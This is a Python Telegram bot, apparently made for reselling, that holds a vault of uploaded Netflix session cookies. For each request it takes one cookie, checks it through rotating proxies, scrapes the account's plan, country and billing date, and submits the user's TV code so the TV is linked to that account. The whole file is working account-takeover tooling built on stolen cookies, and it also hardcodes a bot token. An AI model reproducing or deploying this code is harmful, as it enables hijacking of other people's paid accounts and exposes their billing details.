#!/usr/bin/env python3
"""
Netflix TV Code Auto-Login - Telegram Bot (Full Features)
- Optimized & fast
- Show billing date
- Help, vault, stats commands
- Logging to file
"""

import asyncio
import io
import os
import random
import re
import string
import sys
import urllib.parse
import zipfile
from datetime import datetime
import logging

import requests
from urllib3.exceptions import InsecureRequestWarning
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════════════
#  CONFIG - GANTI DENGAN TOKEN BARU!!!
# ══════════════════════════════════════════════════════════════════════

BOT_TOKEN = "8975773812:AAFOXR6W6sVf_uxU_hUXZvWFJEgeQYfsniA"   # <-- REVOKE DAN GANTI
ADMIN_IDS = [8975773812]   # Ganti dengan ID Telegram Anda

COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 10
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

import threading
cookie_lock = threading.Lock()
stats_lock = threading.Lock()

stats = {
    "total_logins": 0,
    "successful": 0,
    "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}


# ══════════════════════════════════════════════════════════════════════
#  PROXY (sama)
# ══════════════════════════════════════════════════════════════════════

def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()
    m = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, re.IGNORECASE)
    if m:
        d = m.groupdict()
        host = d["host"].strip().strip("[]")
        url = f"{d['scheme']}://{d['user']}:{d['password']}@{host}:{d['port']}" if d.get("user") else f"{d['scheme']}://{host}:{d['port']}"
        return {"http": url, "https": url}
    m = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>[^:\s]+):(?P<port>\d+)$", line)
    if m:
        d = m.groupdict()
        return {"http": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}", "https": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"}
    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", line)
    if m:
        d = m.groupdict()
        return {"http": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}", "https": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"}
    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)$", line)
    if m:
        d = m.groupdict()
        return {"http": f"http://{d['host']}:{d['port']}", "https": f"http://{d['host']}:{d['port']}"}
    parts = line.split(":")
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit() and not d.isdigit():
            return {"http": f"http://{c}:{d}@{a}:{b}", "https": f"http://{c}:{d}@{a}:{b}"}
        if d.isdigit() and not b.isdigit():
            return {"http": f"http://{a}:{b}@{c}:{d}", "https": f"http://{a}:{b}@{c}:{d}"}
    for sep in (r"\s+", r"\|", r";", r","):
        m = re.match(rf"^(?P<host>[^:\s]+):(?P<port>\d+){sep}(?P<user>[^:\s]+):(?P<password>\S+)$", line)
        if m:
            d = m.groupdict()
            return {"http": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}", "https": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"}
    return None


def load_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_proxy_line(line)
                if p:
                    proxies.append(p)
    return proxies


proxies_list = load_proxies()


# ══════════════════════════════════════════════════════════════════════
#  COOKIE EXTRACTION (tetap)
# ══════════════════════════════════════════════════════════════════════

def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())


def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()


def extract_netscape_entries(raw_text):
    entries = []
    for line in raw_text.splitlines():
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) < 7:
            parts = re.split(r"\s+", line, maxsplit=6)
        if len(parts) < 7:
            continue
        if parts[1].upper() not in ("TRUE", "FALSE"):
            continue
        if parts[3].upper() not in ("TRUE", "FALSE"):
            continue
        if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
            continue
        name = canonicalize_name(parts[5])
        if not is_netflix_cookie(parts[0], name):
            continue
        entries.append({"name": name, "value": parts[6]})
    return entries


def extract_json_entries(content):
    try:
        import json
        data = json.loads(content)
    except:
        return []
    if isinstance(data, dict):
        data = data.get("cookies") or data.get("items") or [data]
    if not isinstance(data, list):
        return []
    entries = []
    for cookie in data:
        if not isinstance(cookie, dict):
            continue
        name = canonicalize_name(cookie.get("name", ""))
        if not is_netflix_cookie(cookie.get("domain", ""), name):
            continue
        entries.append({"name": name, "value": cookie.get("value", "")})
    return entries


def extract_raw_entries(raw_text):
    pattern = re.compile(
        r"(?:['\"])?(?P<name>" + "|".join(sorted(ALL_COOKIE_NAMES, key=len, reverse=True)) +
        r")(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.IGNORECASE)
    entries = []
    for m in pattern.finditer(raw_text):
        name = canonicalize_name(m.group("name"))
        value = m.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append({"name": name, "value": value})
    return entries


def extract_cookie_dict(content):
    for extractor in (extract_json_entries, extract_netscape_entries, extract_raw_entries):
        entries = extractor(content)
        if entries:
            break
    else:
        return None
    cookies = {}
    for e in entries:
        if e["name"] not in cookies:
            cookies[e["name"]] = e["value"]
    return cookies if "NetflixId" in cookies else None


# ══════════════════════════════════════════════════════════════════════
#  COOKIE VALIDATION + BILLING DATE
# ══════════════════════════════════════════════════════════════════════

def validate_cookie(cookies, proxy=None):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
        )
        if r.status_code != 200:
            return False, None, None, None
        
        html = r.text
        
        # Country
        country = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', html)
        if not country:
            country = re.search(r'"countryOfSignup":\s*"([^"]+)"', html)
        country_code = country.group(1) if country else None
        
        # Plan
        plan_match = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', html)
        plan = plan_match.group(1) if plan_match else "Unknown"
        
        # Billing date (Next payment)
        billing_match = re.search(
            r'Next payment</h3>\s*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+)</p>',
            html, re.DOTALL | re.IGNORECASE
        )
        billing_date = billing_match.group(1).strip() if billing_match else None
        
        # Alternative pattern
        if not billing_date:
            billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', html)
            billing_date = billing_match.group(1) if billing_match else "N/A"
        
        return True, country_code, plan, billing_date
    except Exception as e:
        logger.error(f"Validation error: {e}")
        return False, None, None, None


# ══════════════════════════════════════════════════════════════════════
#  TV ACTIVATION (ringkas)
# ══════════════════════════════════════════════════════════════════════

def is_tv_code_error(cleaned_text):
    text_lower = cleaned_text.lower()
    patterns = [
        r"that code wasn'?t right", r"code (is )?(incorrect|invalid|wrong)", r"try again",
        r"c[oó]digo (es |que ingresaste |no es |incorrecto|inv[aá]lido)",
        r"c[oó]digo (est[aá] |n[aã]o est[aá] |incorreto|inv[aá]lido)", r"tente novamente",
        r"code (est |n'est pas |incorrect|invalide)", r"code (ist |ung[uü]ltig|falsch)",
        r"codice (non [eè] |sbagliato|non valido)", r"kod (yanlış|ge[çc]ersiz|hatalı)",
        r"kode (salah|tidak valid)", r"coba lagi", r"代码(有误|错误|无效)", r"请重试",
    ]
    for pat in patterns:
        if re.search(pat, text_lower):
            return True
    return False


def is_tv_code_success(final_url, cleaned_text):
    if "/tv/out/success" in final_url.lower():
        return True
    success_patterns = [
        r"your tv is ready", r"sua tv est[aá] pronta", r"tu tv est[aá] lista",
        r"votre t[ée]l[ée] est pr[eê]t", r"dein tv ist bereit", r"la tua tv [eè] pronta",
        r"tv'niz hazır", r"tv của bạn đã sẵn sàng",
    ]
    for pat in success_patterns:
        if re.search(pat, cleaned_text.lower()):
            return True
    return False


def extract_auth_url(html):
    patterns = [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
        r'authURL=([^&\s"\']+)',
        r'value="(c1\.[^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return urllib.parse.unquote(m.group(1))
    return None


def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": "Netflix TV page unavailable"}
    except Exception:
        return {"success": False, "error": "Connection failed"}

    auth_url = extract_auth_url(r.text)
    if not auth_url:
        fallback = re.search(r'c1\.[a-zA-Z0-9%+=/]+', r.text)
        if fallback:
            auth_url = fallback.group(0)
        else:
            return {"success": False, "error": "Could not load activation page"}

    form_data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }
    post_headers = {
        **headers,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.netflix.com/tv8",
        "Origin": "https://www.netflix.com",
    }
    try:
        r = session.post(
            url, data=form_data, headers=post_headers,
            proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True,
        )
    except Exception:
        return {"success": False, "error": "Activation request failed"}

    final_url = r.url if hasattr(r, 'url') else url
    if "/tv/out/success" in final_url.lower():
        return {"success": True, "error": None}

    import html as html_mod
    text = r.text
    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<[^>]+>', ' ', text)
    text = html_mod.unescape(text)
    text = re.sub(r'\s+', ' ', text).strip()

    if is_tv_code_error(text):
        return {"success": False, "error": "Invalid or expired TV code"}
    if is_tv_code_success(final_url, text):
        return {"success": True, "error": None}
    return {"success": False, "error": "Unknown response"}


# ══════════════════════════════════════════════════════════════════════
#  VAULT
# ══════════════════════════════════════════════════════════════════════

def get_vault_cookies():
    if not os.path.exists(COOKIES_DIR):
        return []
    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]


def get_random_cookie_file():
    with cookie_lock:
        files = get_vault_cookies()
        if not files:
            return None, None
        filename = random.choice(files)
        filepath = os.path.join(COOKIES_DIR, filename)
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            os.remove(filepath)
            return filename, content
        except:
            return None, None


def count_vault_cookies():
    return len(get_vault_cookies())


# ══════════════════════════════════════════════════════════════════════
#  ANIMATION
# ══════════════════════════════════════════════════════════════════════

BRAILLE_FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
DOTS_FRAMES = ["", ".", "..", "..."]


async def animate_message(context, chat_id, message_id, stop_event):
    frame_idx = 0
    while not stop_event.is_set():
        frame = BRAILLE_FRAMES[frame_idx % len(BRAILLE_FRAMES)]
        dots = DOTS_FRAMES[(frame_idx // len(BRAILLE_FRAMES)) % len(DOTS_FRAMES)]
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame} Checking cookies{dots}\n\nPlease wait...",
            )
        except:
            pass
        frame_idx += 1
        await asyncio.sleep(0.2)


# ══════════════════════════════════════════════════════════════════════
#  COMMANDS
# ══════════════════════════════════════════════════════════════════════

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    vault_count = count_vault_cookies()
    await update.message.reply_text(
        f"👋 <b>Hey {user.first_name}!</b>\n\n"
        f"🎬 <b>Netflix TV Login Bot</b>\n\n"
        f"📺 Use <code>/tv 12345678</code> to activate your TV\n"
        f"🍪 Cookies in vault: <b>{vault_count}</b>\n\n"
        f"🔹 <code>/help</code> for more commands",
        parse_mode=ParseMode.HTML,
        reply_to_message_id=update.message.message_id,
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 <b>Netflix TV Bot - Help</b>\n\n"
        "🔹 <code>/tv &lt;8-digit code&gt;</code> – Activate your TV with the code shown on screen.\n"
        "🔹 <code>/vault</code> – Check how many cookies are left in the vault.\n"
        "🔹 <code>/stats</code> – Bot statistics (admin only).\n"
        "🔹 <code>/upload</code> – Add cookies via ZIP file (admin only, reply to a ZIP).\n"
        "🔹 <code>/start</code> – Welcome message.\n"
        "🔹 <code>/help</code> – This help.\n\n"
        "💡 <b>How it works:</b>\n"
        "• Each cookie is used only once.\n"
        "• If your TV code is correct and the cookie is valid, your TV will be activated.\n"
        "• The bot will show you the account's plan, country, and next billing date.\n\n"
        "⚠️ If you get 'Invalid code', please generate a new code on your TV and try again."
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.HTML, reply_to_message_id=update.message.message_id)


async def vault_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show remaining cookies count (any user)."""
    count = count_vault_cookies()
    await update.message.reply_text(
        f"🍪 <b>Cookies remaining in vault:</b> {count}",
        parse_mode=ParseMode.HTML,
        reply_to_message_id=update.message.message_id,
    )


async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    message_id = update.message.message_id

    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ <b>Usage:</b> <code>/tv 12345678</code>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    tv_code = re.sub(r'\D', '', args[0])
    if len(tv_code) != 8:
        await update.message.reply_text(
            "❌ TV code must be exactly <b>8 digits</b>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    if count_vault_cookies() == 0:
        await update.message.reply_text(
            "😔 <b>No cookies left in vault!</b>\n\nWait for admin to upload more.",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    status_msg = await update.message.reply_text(
        f"🔍 <b>Starting TV login...</b>\n\n"
        f"📺 Code: <code>{tv_code}</code>\n"
        f"🍪 Searching vault for a working cookie...",
        parse_mode=ParseMode.HTML,
        reply_to_message_id=message_id,
    )

    stop_anim = asyncio.Event()
    anim_task = asyncio.create_task(animate_message(context, chat_id, status_msg.message_id, stop_anim))

    try:
        result = await asyncio.wait_for(asyncio.to_thread(process_tv_login, tv_code), timeout=45.0)
    except asyncio.TimeoutError:
        stop_anim.set()
        await status_msg.edit_text(
            "⏰ <b>Timeout!</b>\n\nThe process took too long. Please try again.",
            parse_mode=ParseMode.HTML,
        )
        return

    stop_anim.set()
    await asyncio.sleep(0.3)

    if result["success"]:
        with stats_lock:
            stats["total_logins"] += 1
            stats["successful"] += 1

        plan = result.get('plan', 'Unknown').upper()
        country = result.get('country', 'N/A')
        billing = result.get('billing_date', 'N/A')
        
        response = (
            f"🎬 <b>TV Login Done!</b>\n\n"
            f"🔑 <b>Code:</b> <code>{tv_code}</code>\n"
            f"💎 <b>Plan:</b> {plan}\n"
            f"🌍 <b>Country:</b> {country}\n"
            f"📅 <b>Billing:</b> {billing}\n\n"
            f"✅ <b>TV Connected Successfully</b>\n\n"
            f"Netflix confirmed your login.\n"
            f"Your device is now ready to stream.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Did your TV show Netflix profiles?\n\n"
            f"Only you can press these buttons.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Confirmed — Enjoy Netflix! 🍿"
        )
    elif result.get("error") == "no_cookies":
        with stats_lock:
            stats["total_logins"] += 1
            stats["failed"] += 1
        response = "😔 <b>All cookies exhausted!</b>\n\nNo working cookies left in vault.\nWait for admin to upload more."
    elif result.get("error") == "all_dead":
        with stats_lock:
            stats["total_logins"] += 1
            stats["failed"] += 1
        response = "❌ <b>No working cookies found!</b>\n\nAll available cookies are dead.\nVault is now empty."
    elif "Invalid or expired" in result.get("error", ""):
        with stats_lock:
            stats["total_logins"] += 1
            stats["codes_rejected"] += 1
        response = (
            f"❌ <b>Invalid or Expired TV Code</b>\n\n"
            f"📺 Code: <code>{tv_code}</code>\n"
            f"🌍 Last cookie country: <b>{result.get('country', 'N/A')}</b>\n\n"
            f"<i>The code you entered is wrong or expired.\n"
            f"Please check your TV screen and try again with a fresh code.</i>"
        )
    else:
        with stats_lock:
            stats["total_logins"] += 1
            stats["codes_rejected"] += 1
        response = (
            f"❌ <b>Activation Failed</b>\n\n"
            f"📺 Code: <code>{tv_code}</code>\n"
            f"🌍 Last cookie country: <b>{result.get('country', 'N/A')}</b>\n"
            f"⚠️ Error: {result.get('error', 'Unknown')}\n\n"
            f"<i>Please try again with a fresh code.</i>"
        )

    await status_msg.edit_text(response, parse_mode=ParseMode.HTML)


def process_tv_login(tv_code):
    proxies = proxies_list
    max_attempts = min(50, max(count_vault_cookies(), 50))
    
    for _ in range(max_attempts):
        filename, content = get_random_cookie_file()
        if not filename or not content:
            return {"success": False, "error": "no_cookies"}

        cookies = extract_cookie_dict(content)
        if not cookies:
            continue

        proxy = random.choice(proxies) if proxies else None
        valid, country, plan, billing_date = validate_cookie(cookies, proxy)

        if not valid:
            continue

        session = requests.Session()
        session.cookies.update(cookies)
        res = submit_tv_code(session, tv_code, proxy)
        res["country"] = country
        res["plan"] = plan
        res["billing_date"] = billing_date if billing_date else "N/A"
        res["cookie_file"] = filename
        return res

    return {"success": False, "error": "all_dead"}


async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message_id = update.message.message_id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "🚫 <b>Admin only!</b>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(
            "📎 <b>Usage:</b> Reply to a ZIP file with <code>/upload</code>\n\n"
            "ZIP should contain .txt or .json cookie files.",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    doc = update.message.reply_to_message.document
    if not doc.file_name.lower().endswith('.zip'):
        await update.message.reply_text(
            "❌ Only <b>.zip</b> files are accepted!",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    status_msg = await update.message.reply_text(
        "📥 <b>Downloading...</b>",
        parse_mode=ParseMode.HTML,
        reply_to_message_id=message_id,
    )

    try:
        file = await context.bot.get_file(doc.file_id)
        zip_bytes = await file.download_as_bytearray()

        await status_msg.edit_text("📂 <b>Extracting...</b>", parse_mode=ParseMode.HTML)

        os.makedirs(COOKIES_DIR, exist_ok=True)
        added = 0
        skipped = 0

        with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
            for name in zf.namelist():
                if name.endswith('/') or name.startswith('__MACOSX') or name.startswith('.'):
                    continue
                if not name.lower().endswith(('.txt', '.json')):
                    skipped += 1
                    continue
                try:
                    content = zf.read(name).decode('utf-8', errors='ignore')
                    cookies = extract_cookie_dict(content)
                    if not cookies:
                        skipped += 1
                        continue
                    base = os.path.basename(name)
                    safe_name = re.sub(r'[<>:"/\\|?*]', '_', base)
                    dest = os.path.join(COOKIES_DIR, safe_name)
                    if os.path.exists(dest):
                        suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                        name_part, ext = os.path.splitext(safe_name)
                        dest = os.path.join(COOKIES_DIR, f"{name_part}_{suffix}{ext}")
                    with open(dest, 'w', encoding='utf-8') as f:
                        f.write(content)
                    added += 1
                except Exception as e:
                    logger.warning(f"Failed to extract {name}: {e}")
                    skipped += 1

        vault_count = count_vault_cookies()
        await status_msg.edit_text(
            f"✅ <b>Upload complete!</b>\n\n"
            f"📥 Added: <b>{added}</b> cookies\n"
            f"⏭️ Skipped: <b>{skipped}</b>\n"
            f"🍪 Total in vault: <b>{vault_count}</b>",
            parse_mode=ParseMode.HTML,
        )

    except Exception as e:
        logger.error(f"Upload error: {e}")
        await status_msg.edit_text(f"❌ <b>Error:</b> {str(e)}", parse_mode=ParseMode.HTML)


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message_id = update.message.message_id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "🚫 <b>Admin only!</b>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    vault_count = count_vault_cookies()
    with stats_lock:
        msg = (
            f"📊 <b>Bot Statistics</b>\n\n"
            f"🍪 <b>Cookies in vault:</b> {vault_count}\n"
            f"🎬 <b>Total logins attempted:</b> {stats['total_logins']}\n"
            f"✅ <b>Successful:</b> {stats['successful']}\n"
            f"❌ <b>Failed (dead cookies):</b> {stats['failed']}\n"
            f"🚫 <b>Codes rejected:</b> {stats['codes_rejected']}\n"
            f"⏰ <b>Bot started:</b> {stats['started_at']}\n"
        )
    await update.message.reply_text(
        msg,
        parse_mode=ParseMode.HTML,
        reply_to_message_id=message_id,
    )


# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════

def main():
    print("=" * 50)
    print("  Netflix TV Login Bot - Full Features")
    print("=" * 50)
    print()

    os.makedirs(COOKIES_DIR, exist_ok=True)

    vault_count = count_vault_cookies()
    print(f"[*] Cookies in vault: {vault_count}")
    print(f"[*] Proxies loaded: {len(proxies_list)}")
    print(f"[*] Admin IDs: {ADMIN_IDS}")
    print()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("vault", vault_command))
    app.add_handler(CommandHandler("tv", tv_command))
    app.add_handler(CommandHandler("upload", upload_command))
    app.add_handler(CommandHandler("stats", stats_command))

    print("[*] Bot started! Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped.")
        sys.exit(0)
